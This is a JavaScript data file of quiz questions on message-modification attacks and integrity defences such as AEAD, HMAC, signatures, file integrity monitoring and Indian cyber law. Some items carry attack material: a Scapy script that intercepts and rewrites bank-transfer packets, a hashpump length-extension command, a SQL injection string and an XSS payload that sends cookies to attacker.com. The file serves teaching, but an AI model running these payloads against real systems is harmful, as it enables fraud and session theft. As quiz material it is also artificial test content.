const questions = [
  {
    question: "What is an Active Message Modification Attack, and which pillar of the CIA Triad does it violate?",
    shortAnswer: "An attack where an in-flight message is intercepted, altered, deleted, or substituted before reaching the destination, violating the Integrity pillar (and often Authenticity).",
    explanation: "Unlike passive eavesdropping which leaves data untouched, active message modification deliberately corrupts or rewrites packet payloads (e.g. changing an electronic funds transfer from ₹500 to ₹50,000, or modifying a SCADA grid command from 'NORMAL' to 'OVERLOAD'). This directly destroys data integrity and trust in communications.",
    hint: "Think about modifying the text of a letter while it is in the postman's bag.",
    level: "basic",
    codeExample: `// Message Modification Threat Vector:
// Original Packet : { from: "Mamata", to: "Debangshu", amount: ₹500 }
// Modified Packet : { from: "Mamata", to: "Attacker_Mule", amount: ₹50,000 }`
  },
  {
    question: "Why does simple encryption (e.g. AES in CBC or Stream cipher mode) FAIL to protect against Message Modification without an integrity tag?",
    shortAnswer: "Because many encryption modes are 'malleable', allowing an attacker to predictable flip ciphertext bits to alter corresponding plaintext bits without knowing the encryption key.",
    explanation: "In stream ciphers (or AES-CTR / AES-CBC), the ciphertext is XORed with a keystream: $C = P \\oplus K$. If an attacker flips bit $i$ in ciphertext ($C' = C \\oplus \\Delta$), upon decryption the plaintext becomes $P' = P \\oplus \\Delta$. If the attacker knows the position of 'amount=00500', they can flip bits to produce 'amount=50000' cleanly.",
    hint: "Flipping a bit in the scrambled code predictably flips the exact same bit in the decoded message.",
    level: "expert",
    codeExample: `// CBC / CTR Bit-Flipping Malleability:
// Plaintext  : "role=user&id=99"
// Target     : Change "user" to "root" (Delta = "user" ^ "root" = 0x17 0x1e 0x1a 0x06)
// Attack     : Ciphertext[prev_block] ^= Delta
// Decryption : Automatically yields "role=root&id=99" without triggering key errors!`
  },
  {
    question: "What is Authenticated Encryption with Associated Data (AEAD), and why is it mandatory in modern cryptography?",
    shortAnswer: "AEAD combines symmetric encryption and cryptographic integrity verification in a single primitive, generating an authentication tag that detects any modification.",
    explanation: "Legacy systems combined encryption and hashing manually (e.g. Encrypt-then-MAC), which often led to critical implementation flaws like padding oracle attacks. AEAD ciphers (AES-GCM, ChaCha20-Poly1305) integrate data encryption with Galois Message Authentication Codes natively. Any single-bit tampering with the ciphertext or unencrypted associated data (headers) causes decryption to abort instantly.",
    hint: "A safe that automatically locks and self-destructs if even a single scratch is made on its outer surface.",
    level: "moderate",
    codeExample: `// Node.js AES-256-GCM AEAD Implementation:
const crypto = require('crypto');
function encryptAEAD(plaintext, key, iv, associatedData) {
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  cipher.setAAD(Buffer.from(associatedData));
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const authTag = cipher.getAuthTag(); // 16-byte cryptographic seal
  return { ciphertext, authTag };
}`
  },
  {
    question: "How does HMAC (Hash-Based Message Authentication Code) guarantee message integrity and authenticity?",
    shortAnswer: "HMAC hashes the message combined with a shared secret key in a dual-nested construction: HMAC(K, m) = H((K ^ opad) || H((K ^ ipad) || m)).",
    explanation: "Simply hashing `H(Key || Message)` is vulnerable to length-extension attacks in Merkle-Damgård hashes (MD5, SHA-1, SHA-256). HMAC uses two outer and inner padding constants (`opad = 0x5c`, `ipad = 0x36`) to create a cryptographically secure pseudo-random function. An attacker without the secret key cannot forge a valid HMAC tag for a modified message.",
    hint: "A dual-nested cryptographic wax seal that cannot be forged without the secret ring.",
    level: "expert",
    codeExample: `// HMAC-SHA256 Integrity Verification:
const computedTag = crypto.createHmac('sha256', sharedKey).update(receivedPayload).digest('hex');
if (!crypto.timingSafeEqual(Buffer.from(computedTag), Buffer.from(receivedTag))) {
  throw new SecurityException("Tampering Detected! In-flight packet modified.");
}`
  },
  {
    question: "What are the three core mathematical security properties of Cryptographic Hash Functions (e.g. SHA-256 / SHA-3)?",
    shortAnswer: "1. Pre-image Resistance (One-Way); 2. Second Pre-image Resistance (Weak Collision); 3. Collision Resistance (Strong Collision).",
    explanation: "1. Pre-image Resistance: Given hash $h$, it is computationally infeasible to find $m$ such that $H(m) = h$. 2. Second Pre-image Resistance: Given message $m_1$, it is infeasible to find $m_2 \\neq m_1$ such that $H(m_1) = H(m_2)$. 3. Collision Resistance: It is infeasible to find any arbitrary pair $(m_1, m_2)$ such that $H(m_1) = H(m_2)$.",
    hint: "One-way, hard to find an identical twin, and hard to find any two matching fingerprints.",
    level: "moderate",
    codeExample: `// Hash Collision Complexity:
// SHA-256 Pre-image Security: 2^256 operations
// SHA-256 Collision Security: 2^128 operations (Birthday Paradox bound)`
  },
  {
    question: "How does Scapy facilitate in-flight packet interception and modification in penetration testing labs?",
    shortAnswer: "Scapy is a Python packet manipulation library that sniffs network packets, modifies arbitrary header/payload fields, recalculates checksums, and re-injects frames.",
    explanation: "Scapy allows security researchers to construct custom network stacks. Using netfilter queues (`iptables -j NFQUEUE`), Scapy intercepts packets in flight, searches for specific payload byte patterns (e.g. `amount=500`), rewrites the string in memory, deletes the cached IP/TCP checksums so Scapy recalculates valid checksums automatically, and reinjects the altered packet.",
    hint: "A Swiss Army knife in Python for taking apart packets, changing the bytes, and putting them back on the wire.",
    level: "expert",
    codeExample: `# Python Scapy Packet Tampering Injection Script:
from scapy.all import *
def tamper_packet(pkt):
    if pkt.haslayer(Raw) and b"toAccount=Debangshu" in pkt[Raw].load:
        pkt[Raw].load = pkt[Raw].load.replace(b"toAccount=Debangshu", b"toAccount=AttackerMule")
        del pkt[IP].chksum
        del pkt[TCP].chksum
        send(pkt)
sniff(filter="tcp port 8080", prn=tamper_packet)`
  },
  {
    question: "How do Digital Signatures (e.g. ECDSA / Ed25519) provide Non-Repudiation in addition to Data Integrity?",
    shortAnswer: "A digital signature is generated using the sender's private key; because only the sender possesses the private key, they cannot later deny authoring the message.",
    explanation: "HMAC uses a shared symmetric key, meaning either party could theoretically generate the tag (no non-repudiation). Digital signatures use asymmetric cryptography: sender Mamata signs the message hash with her private key $S = \\text{Sign}_{Priv}(H(m))$, and receiver Debangshu verifies it using Mamata's public key. This proves both that the data was not modified in transit and that Mamata authored it.",
    hint: "A signature that only you can write with your private pen, but the whole world can verify with your public seal.",
    level: "moderate",
    codeExample: `// Ed25519 Fast Asymmetric Digital Signature:
const { generateKeyPairSync, sign, verify } = require('crypto');
const { publicKey, privateKey } = generateKeyPairSync('ed25519');
const signature = sign(null, Buffer.from("Transfer ₹50,000 to Mahima"), privateKey);
const isValid = verify(null, Buffer.from("Transfer ₹50,000 to Mahima"), publicKey, signature); // Returns true`
  },
  {
    question: "What is an In-Flight TCP Sequence Number Manipulation attack, and how does it desynchronize TCP sessions?",
    shortAnswer: "An attacker injects forged TCP packets with modified sequence numbers, corrupting the byte stream and causing the legitimate endpoints' TCP state machines to desynchronize.",
    explanation: "TCP relies on strict 32-bit Sequence and Acknowledgment numbers to reassemble in-order byte streams. An in-line attacker injecting extra data bytes must continuously rewrite the sequence numbers of all subsequent legitimate packets by adding an offset $\\Delta = \\text{len}(\\text{injected})$. If this tracking fails, the receiver emits duplicate ACKs and drops the connection.",
    hint: "Adding an extra chapter to a book and re-numbering all remaining pages so the reader doesn't notice.",
    level: "expert",
    codeExample: `// TCP Sequence Desynchronization:
// Injected Payload: 100 Bytes
// Attacker rule: For all future client packets: pkt.seq += 100
// For all server ACKs: pkt.ack -= 100`
  },
  {
    question: "Under the Indian Information Technology Act 2000, what are the criminal penalties for Tampering with Computer Source Documents?",
    shortAnswer: "Section 65 criminalizes intentional tampering with source code, configs, or system records with imprisonment up to 3 years and fines up to ₹2 Lakhs.",
    explanation: "Section 65 states: 'Whoever knowingly or intentionally conceals, destroys or alters or intentionally or knowingly causes another to conceal, destroy or alter any computer source code used for a computer, computer programme, computer system or computer network... shall be punishable with imprisonment up to three years, or with fine which may extend up to two lakh rupees, or with both.'",
    hint: "Section 65 specifically penalizes tampering with code, configs, and digital source records.",
    level: "moderate",
    codeExample: `// Statutory Offense (IT Act 2000 Section 65):
// Offense: Tampering with computer source code, firewall configs, or ledger code
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹2,00,000`
  },
  {
    question: "How does DNP3 Secure Authentication (SAv5) protect electrical power grid SCADA telemetry against in-flight command tampering?",
    shortAnswer: "It enforces HMAC-SHA256 challenge-response verification for all critical grid control commands (e.g. tripping a 220kV circuit breaker).",
    explanation: "Standard industrial Modbus and DNP3 protocols transmit control commands in cleartext. Under DNP3 Secure Authentication version 5 (IEC 62351-5), when an outstation in Barrackpore receives a critical 'Open Circuit Breaker' command, it sends a cryptographic Challenge ($C$) back to the master. The master must reply with a valid HMAC signature before the physical breaker relay will trip.",
    hint: "A substation refusing to throw a master power switch until a digital challenge-response password is confirmed.",
    level: "expert",
    codeExample: `// DNP3 SAv5 Challenge-Response Sequence:
// Master   -> Operate Command (Trip Breaker 14)
// Substation -> Challenge Object (Nonce = 0x9a8f4e1b)
// Master   -> Challenge Response (HMAC_K(Nonce || Command))
// Substation -> Verifies HMAC -> Executes Breaker Trip Relay`
  },
  {
    question: "What is an XML/JSON In-Flight Parameter Injection attack on Web Services?",
    shortAnswer: "An active attack where an in-line proxy intercepts an API call and injects extra JSON attributes or XML tags to escalate user privileges or alter transaction parameters.",
    explanation: "In modern REST and SOAP APIs, parameters are passed as JSON or XML objects. If an in-line proxy intercepts `{\"item\": \"laptop\", \"price\": 50000}`, the attacker alters the payload to `{\"item\": \"laptop\", \"price\": 50, \"role\": \"admin\"}`. If backend microservices do not verify digital signatures or HMAC tags, the server processes the order at the fraudulent price.",
    hint: "Adding extra fraudulent lines to a digital purchase order while it is in transit.",
    level: "moderate",
    codeExample: `// In-Flight JSON Tampering:
// Original : {"transactionId": 9012, "amount": 5000, "status": "PENDING"}
// Tampered : {"transactionId": 9012, "amount": 5000, "status": "APPROVED", "fee": 0}`
  },
  {
    question: "How does Merkle Tree Root Hashing ensure immutable file and database record integrity?",
    shortAnswer: "It builds a cryptographic binary tree of hashes where the Root Hash cryptographically commits to every individual data block; altering any single record changes the Root Hash.",
    explanation: "In distributed ledgers, blockchain systems, and Git version control, data blocks are hashed in pairs: $H_{AB} = H(H_A \\parallel H_B)$. If an attacker modifies even a single comma in transaction $A$, its hash $H_A$ changes, propagating up the tree and altering the top-level Merkle Root. System auditors verify millions of records in $O(\\log N)$ time by verifying only the Merkle proof path.",
    hint: "A family tree of hashes where changing one baby's name changes the family crest at the very top.",
    level: "expert",
    codeExample: `// Merkle Root Verification:
// Leaf A = Hash(Tx1), Leaf B = Hash(Tx2) -> Node AB = Hash(Leaf A || Leaf B)
// Merkle Root = Hash(Node AB || Node CD)
// Tampering with Tx1 invalidates Node AB and corrupts Merkle Root immediately!`
  },
  {
    question: "What is a Padding Oracle Attack (e.g. POODLE / Vaudenay attack) on CBC mode encryption?",
    shortAnswer: "An active attack where an adversary alters ciphertext bytes and uses server padding error responses to mathematically decrypt the entire ciphertext without the key.",
    explanation: "In PKCS#7 padded CBC mode, servers return different error messages for 'invalid cryptographic padding' versus 'valid padding with invalid data'. By systematically modifying the last byte of the previous ciphertext block and observing server padding error codes, an adversary decrypts the plaintext byte-by-byte in $256 \\times N$ queries without ever knowing the AES key.",
    hint: "Asking the server 256 questions per byte: 'Did this padding break?' to guess the secret letter.",
    level: "expert",
    codeExample: `// Padding Oracle Decryption Byte Equation:
// Intermediate_Byte[i] = Guess_Byte ^ Pad_Value
// Plaintext[i] = Intermediate_Byte[i] ^ Ciphertext_Prev_Block[i]`
  },
  {
    question: "How does the 'Encrypt-then-MAC' (EtM) paradigm protect against Padding Oracle and Bit-Flipping attacks?",
    shortAnswer: "The MAC is computed over the ciphertext; upon receiving a packet, the server verifies the MAC tag first and drops tampered packets before attempting any decryption.",
    explanation: "In flawed designs (MAC-then-Encrypt or Encrypt-and-MAC), the server must decrypt the ciphertext before verifying the integrity tag, exposing the system to padding oracle timing attacks. In Encrypt-then-MAC (mandated in IPsec and TLS 1.3), the receiver validates `HMAC(Ciphertext)` first. Any modified bit fails HMAC verification immediately, and decryption is never attempted.",
    hint: "Check the outer wax seal before opening the box: if the seal is broken, throw the box away immediately.",
    level: "expert",
    codeExample: `// Encrypt-then-MAC Verification Pipeline:
// Step 1: Verify HMAC_K2(Ciphertext) == Received_Tag
// Step 2: IF INVALID -> Drop immediately! (Never call AES Decrypt)
// Step 3: IF VALID   -> Call AES_Decrypt_K1(Ciphertext)`
  },
  {
    question: "What is SQL Injection (SQLi) via In-Flight HTTP Parameter Modification?",
    shortAnswer: "Altering in-transit HTTP request parameters to inject SQL meta-characters (e.g. `' OR '1'='1`) into unparameterized database queries, altering backend database execution logic.",
    explanation: "When web applications concatenate input directly into SQL strings, an attacker modifying in-flight HTTP parameters changes `SELECT * FROM users WHERE user = 'admin' AND pass = '123'` into `SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1'`. This bypasses authentication and returns all database records.",
    hint: "Injecting SQL command instructions into fields meant only for data.",
    level: "moderate",
    codeExample: `// Vulnerable vs Secure SQL Execution:
// Vulnerable: db.execute("SELECT * FROM accounts WHERE id = " + input_id);
// Secure:     db.execute("SELECT * FROM accounts WHERE id = ?", [input_id]); // Prepared Statement`
  },
  {
    question: "How does JSON Web Signature (JWS / RFC 7515) guarantee API token integrity in modern FinTech architectures?",
    shortAnswer: "JWS appends a cryptographic digital signature (RS256/ES256) to base64url-encoded JSON claims, ensuring any tampering with user roles or amounts invalidates the token.",
    explanation: "In JWT tokens (`Header.Payload.Signature`), the payload contains claims like `{\"sub\": \"Mamata\", \"role\": \"admin\", \"limit\": ₹100000}`. If an active attacker alters `limit: ₹100000` to `₹10000000`, the receiving server computes `Verify(Header.Payload, Signature)`. Because the attacker lacks the private signing key, the signature verification fails and the request is rejected.",
    hint: "A signed digital ID card where erasing and re-writing your role invalidates the cryptographic stamp.",
    level: "moderate",
    codeExample: `// JWT / JWS Token Structure:
// eyJhbGciOiJFUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJsaW1pdCI6NTAwMDB9.SIGNATURE_BYTES
// If payload is modified, crypto.verify() fails immediately.`
  },
  {
    question: "What is File Integrity Monitoring (FIM), and how does it detect unauthorized data modification on server disks?",
    shortAnswer: "FIM tools (e.g. Tripwire, Wazuh, AIDE) continuously calculate cryptographic hashes of critical system binaries and configuration files, alerting upon any hash deviation.",
    explanation: "FIM maintains a baseline database containing cryptographic SHA-256 hashes of critical files (`/etc/passwd`, `/etc/nginx/nginx.conf`, kernel binaries). An automated daemon scans the file system periodically. If an attacker modifies a single byte in a configuration file or replaces a system binary with a rootkit, the hash mismatch triggers an instant SIEM alert.",
    hint: "A digital security guard checking checksum fingerprints on all system files every hour.",
    level: "moderate",
    codeExample: `// AIDE / Wazuh File Integrity Rule:
/etc/nginx/nginx.conf  R+sha256
/usr/sbin/sshd         R+sha512+p+u+g
# Alert: SHA-256 mismatch detected on /etc/nginx/nginx.conf -> Immediate SOC incident!`
  },
  {
    question: "How does the 'Birthday Attack' mathematically limit the collision resistance of cryptographic hashes?",
    shortAnswer: "Due to the Birthday Paradox, a cryptographic hash with n-bit output requires only 2^(n/2) operations to find a collision (two different messages producing the same hash).",
    explanation: "In a room of 23 people, the probability that two people share a birthday exceeds 50%. Mathematically, for an $n$-bit hash function, finding a collision requires only $\\approx 1.17 \\times 2^{n/2}$ evaluations. For MD5 (128 bits), collisions require only $2^{64}$ steps (broken); for SHA-256 (256 bits), finding collisions requires $2^{128}$ operations, which remains computationally infeasible.",
    hint: "Finding two people with the same birthday is much easier than finding someone who shares your specific birthday.",
    level: "expert",
    codeExample: `// Birthday Paradox Collision Bounds:
// MD5 (128-bit)    : Collisions found in 2^64 operations (BROKEN!)
// SHA-1 (160-bit)  : Collisions found in 2^80 operations (SHAttered attack - BROKEN!)
// SHA-256 (256-bit): Collisions require 2^128 operations (Completely Secure)`
  },
  {
    question: "Under the Indian DPDP Act 2023, what are the obligations regarding Data Integrity for health and banking records?",
    shortAnswer: "Section 8(3) mandates that Data Fiduciaries must ensure personal data is accurate, complete, and protected against unauthorized modification and tampering.",
    explanation: "If a hospital clinical network in Ichapur or a payment switch in Kolkata allows patient medical records or banking balances to be modified by in-flight tampering, it constitutes a statutory failure under Section 8(3) and Section 8(5). The Data Protection Board of India (DPBI) can impose statutory penalties up to ₹250 Crores under Section 33.",
    hint: "Organizations are legally required to guarantee that citizen health and money records cannot be tampered with.",
    level: "moderate",
    codeExample: `// DPDP Statutory Integrity Mandate:
// Legal Section: Section 8(3) & 8(5) DPDP Act 2023 ("Accuracy & Completeness")
// Technical Requirement: Mandatory Cryptographic AEAD / Digital Signatures on all patient records`
  },
  {
    question: "Synthesize an end-to-end defense architecture that guarantees 100% Data Integrity across in-transit, in-rest, and in-memory states.",
    shortAnswer: "An integrated framework combining TLS 1.3 AEAD (in-transit), Ed25519 digital signatures and WORM storage (in-rest), and AMD SEV memory encryption (in-memory).",
    explanation: "To achieve complete data integrity: 1. In-Transit: Enforce TLS 1.3 with AES-256-GCM / ChaCha20-Poly1305 and HMAC-SHA256 request signing. 2. In-Rest: Store critical audit logs on Write-Once-Read-Many (WORM) storage with Merkle root hash trees and Ed25519 signatures. 3. In-Memory: Enable AMD SEV / Intel SGX hardware memory encryption to prevent RAM injection. 4. Application: Enforce parameterized SQL queries and JWS API tokens.",
    hint: "Lock the moving stream, lock the disk storage with write-once seals, and lock the computer memory chips.",
    level: "expert",
    codeExample: `// Master Enterprise Data Integrity Blueprint:
// 1. In-Transit : TLS 1.3 AEAD (AES-256-GCM) + HMAC-SHA256 Payload Signature
// 2. In-Rest    : SHA-512 Merkle Tree Ledger + WORM S3 Object Lock (Compliance Mode)
// 3. In-Memory  : AMD SEV Hardware Memory Encryption + Secure Boot TPM 2.0 Attestation
// 4. App Layer  : Parameterized Prepared Statements + JWS ES256 Signed Claims`
  },
  {
    question: "What is BGP Route Prefix Tampering, and how does RPKI Route Origin Authorization prevent it?",
    shortAnswer: "An attacker advertises a forged BGP AS path with modified prefix lengths to hijack traffic; RPKI validates route announcements against cryptographically signed ROA certificates.",
    explanation: "BGP routers blindly trust route advertisements. An attacker modifying in-flight BGP announcements claims a `/24` prefix for Kolkata Bank. With RPKI (Resource Public Key Infrastructure), routers query a cryptographically signed Route Origin Authorization (ROA) issued by APNIC. If the origin ASN does not match the signed certificate, the route is marked `Invalid` and discarded.",
    hint: "A digitally signed deed proving which ISP is authorized to announce an IP address block.",
    level: "expert",
    codeExample: `// Cisco BGP RPKI Validation Configuration:
router bgp 65000
 bgp origin-as validation enable
!
route-map RPKI-FILTER permit 10
 match rpki valid
route-map RPKI-FILTER drop 20
 match rpki invalid`
  },
  {
    question: "How does a Length-Extension Attack compromise naive hash constructions like `H(secret || message)`?",
    shortAnswer: "Merkle-Damgård hashes output the internal compression state; an attacker can append extra data and compute a valid hash for `secret || message || extension` without knowing the secret.",
    explanation: "In MD5 and SHA-256, the final hash output is simply the internal state of the last block. If an application authenticates API calls using `Token = SHA256(Secret || \"user=Debangshu\")`, an attacker can use the tool `hashpump` to append `\"&role=admin\"` and compute the valid hash for the extended string without ever learning the secret key! This is why HMAC is mandatory.",
    hint: "Resuming a math calculation from the final step without needing the starting numbers.",
    level: "expert",
    codeExample: `# HashPump Length Extension Exploit:
hashpump -s "original_hash" -d "user=Debangshu" -a "&role=admin" -k 16
# Output: New Valid Hash + Extended Payload!
# Defense: ALWAYS use HMAC-SHA256 instead of raw H(key || data)`
  },
  {
    question: "What is an In-Flight DLL / Binary Hijacking attack, and how does Authenticode code signing prevent it?",
    shortAnswer: "An attacker modifies an executable binary or DLL in transit during an unencrypted HTTP download; Authenticode checks cryptographic X.509 signatures before execution.",
    explanation: "When users download software over unencrypted HTTP, an in-line attacker can inject malicious shellcode into the `.exe` file. Microsoft Authenticode and Apple Code Signing embed an asymmetric digital signature in the PE/Mach-O header. Windows SmartScreen calculates the binary hash and verifies it against the developer's trusted certificate, blocking execution if a single byte was altered.",
    hint: "Checking the digital wax seal on software before installing it on your computer.",
    level: "moderate",
    codeExample: `// SignTool Code Signing Command:
signtool sign /f corporate_cert.pfx /p Password123 /t http://timestamp.digicert.com setup.exe
// Verification:
signtool verify /pa setup.exe`
  },
  {
    question: "How does the 'Bit-Flipping Attack' specifically bypass checksums in unauthenticated IPv4 packets?",
    shortAnswer: "An attacker flips a bit in the IP payload and makes an equal and opposite adjustment in an unused header field (or checksum field) to keep the 16-bit one's complement sum identical.",
    explanation: "The standard IPv4 header and TCP checksums are simple 16-bit one's complement additions ($Checksum = \\sim \\sum Words$). Checksums detect accidental line noise, not intentional attacks. An attacker modifying payload bytes can easily calculate the 16-bit difference and adjust the checksum field directly so the receiving network card accepts the modified packet without error.",
    hint: "Checksums catch accidental line static, not intelligent hackers with calculators.",
    level: "moderate",
    codeExample: `// TCP / IP Checksum vs Cryptographic MAC:
// IPv4 Checksum : 16-bit addition (Trivially recalculable by attacker)
// HMAC-SHA256   : 256-bit Keyed Cryptographic Tag (Computationally IMPOSSIBLE to forge)`
  },
  {
    question: "What is Cross-Site Scripting (XSS) payload injection in web applications?",
    shortAnswer: "Injecting malicious JavaScript into web application input fields, which executes in other users' browsers to steal session cookies or tamper with DOM elements.",
    explanation: "In Stored or Reflected XSS, an attacker submits `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>` in a comment or profile field. When another user views the page, their browser executes the script, granting the attacker full access to the victim's session tokens and DOM state. Mitigation requires HTML entity encoding and strict Content Security Policy (CSP).",
    hint: "Tricking the website into running the attacker's JavaScript code inside the victim's browser.",
    level: "moderate",
    codeExample: `// Content Security Policy (CSP) Mitigation:
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.bank.in; object-src 'none';`
  },
  {
    question: "How does Content Security Policy (CSP) with Nonces prevent in-flight script tampering in modern web browsers?",
    shortAnswer: "The server generates a unique cryptographic nonce per HTTP response; the browser executes only `<script>` tags bearing the matching nonce, blocking injected scripts.",
    explanation: "With CSP Nonces enabled, the server headers return `Content-Security-Policy: script-src 'nonce-d8a7ef90'`. Legitimate scripts include `<script nonce=\"d8a7ef90\">`. If an active attacker or extension injects a rogue `<script>` tag into the HTML stream in flight, the injected tag lacks the matching single-use cryptographic nonce, and the browser refuses to execute it.",
    hint: "Every script must have the secret one-time password on its forehead to be allowed to run.",
    level: "expert",
    codeExample: `// CSP Nonce Header & HTML Tag:
// HTTP Header : Content-Security-Policy: script-src 'nonce-R4nd0mN0nc3'
// Valid Script: <script nonce="R4nd0mN0nc3">console.log("Safe code");</script>
// Injected    : <script>alert(document.cookie);</script> (BLOCKED BY BROWSER!)`
  },
  {
    question: "What is Git Commit Signing (GPG / SSH), and how does it prevent in-flight code repository tampering?",
    shortAnswer: "Developers sign Git commits with their private GPG/SSH key; GitHub/GitLab verifies the signature to guarantee code was authored by authorized developers and not tampered with.",
    explanation: "Git commit author names (`git config user.name`) are easily forged. An in-line attacker or compromised CI/CD runner could inject backdoor code into a production repository under a senior architect's name. GPG commit signing (`git commit -S`) cryptographically hashes the tree, commit message, and author metadata, proving authenticity with a 'Verified' badge.",
    hint: "Putting your personal cryptographic wax stamp on every single line of code you commit.",
    level: "moderate",
    codeExample: `# Sign Git Commits with SSH / GPG Key:
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global gpg.format ssh
git config --global commit.gpgsign true
# Result: Verified green badge on all repository commits`
  },
  {
    question: "How does WORM (Write Once, Read Many) Storage prevent active log tampering by attackers with root access?",
    shortAnswer: "WORM storage enforces hardware-level and cloud-policy immutability, preventing even root or administrator accounts from deleting or modifying archived logs for a set retention period.",
    explanation: "When attackers compromise a Linux server, their first action is tampering with `/var/log/auth.log` or database audit trails. WORM storage (e.g. AWS S3 Object Lock in Compliance Mode) locks log objects cryptographically. Neither root users, root API keys, nor AWS account owners can overwrite or delete the logs until the retention timer (e.g. 180 days per CERT-In rules) expires.",
    hint: "Carving records into stone: once written, no one—not even the king—can erase them.",
    level: "expert",
    codeExample: `// AWS S3 Object Lock (Compliance Mode):
aws s3api put-object-retention \\
  --bucket kolkata-audit-logs \\
  --key 2026/auth-ledger.json \\
  --retention '{"Mode": "COMPLIANCE", "RetainUntilDate": "2026-12-31T23:59:59Z"}'`
  },
  {
    question: "Under Section 66C of the IT Act 2000, what is the penalty for fraudulent identity and password tampering?",
    shortAnswer: "Imprisonment up to 3 years and a fine up to ₹1 Lakh for fraudulently or dishonestly making use of the electronic signature, password, or unique identification feature of any person.",
    explanation: "Section 66C specifically covers identity theft and credential tampering: 'Whoever, fraudulently or dishonestly make use of the electronic signature, password or any other unique identification feature of any other person, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to rupees one lakh.'",
    hint: "Section 66C penalizes password theft and digital identity tampering.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66C):
// Offense: Stealing or tampering with passwords, tokens, or digital signatures
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,000`
  },
  {
    question: "Synthesize the mathematical relationship between AEAD Galois Hash (GHASH) and Polynomial Field Arithmetic in preventing in-flight tampering.",
    shortAnswer: "AES-GCM computes GHASH over the ciphertext and associated data in the Galois Field GF(2^128); any bit flip changes the polynomial evaluation, causing tag verification to fail.",
    explanation: "In AES-GCM, the authentication tag $T$ is computed as $T = \\text{GHASH}_H(\\text{AAD}, C) \\oplus E_K(J_0)$, where $\\text{GHASH}$ treats 128-bit blocks as coefficients of a polynomial evaluated over the finite field $GF(2^{128})$ with irreducible polynomial $f(x) = x^{128} + x^7 + x^2 + x + 1$. Because polynomial evaluation is uniform and key-dependent ($H = E_K(0)$), forging a valid tag for altered ciphertext $C'$ has probability $\\le m / 2^{128}$, making in-flight tampering mathematically impossible.",
    hint: "Galois field polynomial math ensures any altered bit completely scrambles the 128-bit authentication seal.",
    level: "expert",
    codeExample: `// Galois Field GHASH Polynomial Evaluation:
// Tag = ( AAD_1 * H^m + ... + C_1 * H^2 + C_n * H + Lengths * H ) ^ AES_K(IV)
// Tampering Probability: <= m / 2^128 (Mathematically negligible!)`
  }
];

export default questions;
